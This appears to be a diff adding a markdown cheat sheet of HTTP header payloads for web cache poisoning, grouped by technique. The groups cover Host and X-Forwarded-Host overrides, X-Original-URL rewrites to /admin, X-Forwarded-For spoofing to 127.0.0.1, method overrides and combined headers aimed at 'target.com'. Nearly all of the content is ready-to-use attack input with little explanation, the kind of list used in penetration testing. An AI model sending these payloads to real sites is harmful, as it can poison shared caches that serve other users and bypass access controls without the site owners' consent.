@@ -1,0 +1,176 @@
+---
+
+## 🔥 HOST / HOST-LIKE CACHE POISONING
+
+```
+Host: cache-test.example
+X-Forwarded-Host: cache-test.example
+X-Host: cache-test.example
+X-Forwarded-Server: cache-test.example
+X-HTTP-Host-Override: cache-test.example
+X-Original-Host: cache-test.example
+Forwarded: host=cache-test.example
+```
+
+---
+
+## 🔥 URL / PATH CONFUSION CACHE POISONING
+
+```
+X-Original-URL: /robots.txt
+X-Original-URL: /favicon.ico
+X-Original-URL: /nonexistent
+X-Rewrite-URL: /robots.txt
+X-Rewrite-URL: /favicon.ico
+X-Forwarded-Uri: /robots.txt
+X-Forwarded-Uri: /admin
+X-Request-URI: /robots.txt
+X-Request-URI: /login
+```
+
+---
+
+## 🔥 PROTOCOL / SCHEME CACHE POISONING
+
+```
+X-Forwarded-Proto: http
+X-Forwarded-Proto: https
+X-Scheme: http
+X-Scheme: https
+Forwarded: proto=http
+Forwarded: proto=https
+X-Forwarded-Port: 80
+X-Forwarded-Port: 443
+```
+
+---
+
+## 🔥 ACCEPT / CONTENT NEGOTIATION CACHE POISONING
+
+```
+Accept: text/plain
+Accept: text/html
+Accept: application/json
+Accept: */*
+Accept-Encoding: identity
+Accept-Encoding: gzip
+Accept-Encoding: br
+Accept-Encoding: deflate
+Accept-Language: zz-ZZ
+Accept-Language: en-GB,en;q=0.1
+Accept-Language: fr-FR,fr;q=0.1
+```
+
+---
+
+## 🔥 USER-AGENT BASED CACHE POISONING
+
+```
+User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_0)
+User-Agent: Mozilla/5.0 (Linux; Android 14)
+User-Agent: Googlebot/2.1
+User-Agent: Bingbot/2.0
+User-Agent: curl/8.0
+User-Agent: Wget/1.21
+```
+
+---
+
+## 🔥 IP / PROXY TRUST CACHE POISONING
+
+```
+X-Forwarded-For: 127.0.0.1
+X-Forwarded-For: ::1
+X-Forwarded-For: 10.0.0.1
+X-Real-IP: 127.0.0.1
+X-Client-IP: 127.0.0.1
+Forwarded: for=127.0.0.1
+```
+
+---
+
+## 🔥 CACHE DIRECTIVE CONFUSION
+
+```
+Cache-Control: public
+Cache-Control: no-cache
+Cache-Control: max-age=600
+Cache-Control: s-maxage=600
+Pragma: no-cache
+Surrogate-Control: max-age=600
+```
+
+---
+
+## 🔥 AUTH / SESSION ADJACENT CACHE POISONING (PASIVO)
+
+```
+Authorization: Bearer cache-test
+Authorization: Basic Y2FjaGU6dGVzdA==
+Cookie: cache_test=1
+Cookie: lang=zz-ZZ
+```
+
+---
+
+## 🔥 RANGE / PARTIAL RESPONSE CACHE POISONING
+
+```
+Range: bytes=0-100
+Range: bytes=0-500
+Range: bytes=100-200
+```
+
+---
+
+## 🔥 METHOD OVERRIDE CACHE POISONING
+
+```
+X-HTTP-Method-Override: POST
+X-HTTP-Method-Override: PUT
+X-Method-Override: POST
+X-Method-Override: DELETE
+```
+
+---
+
+## 🔥 RARE / EDGE CASE CACHE POISONING (MUY POCO AUDITADO)
+
+```
+X-Forwarded-Prefix: /cache-test
+X-Original-Path: /robots.txt
+X-Forwarded-Path: /robots.txt
+X-Forwarded-Base: /cache-test
+X-ProxyUser-IP: 127.0.0.1
+X-Forwarded-SSL: on
+X-Forwarded-SSL: off
+```
+
+---
+
+## 🔥 MULTI-HEADER CACHE DESYNC COMBINATIONS
+
+```
+Host: target.com
+X-Forwarded-Host: cache-test.example
+```
+
+```
+Accept-Encoding: identity
+User-Agent: Googlebot
+```
+
+```
+X-Original-URL: /robots.txt
+Accept: text/plain
+```
+
+```
+X-Forwarded-Proto: http
+X-Forwarded-Host: cache-test.example
+```
+
+```
+Accept-Language: zz-ZZ
+User-Agent: Mozilla/5.0 (iPhone)
+```
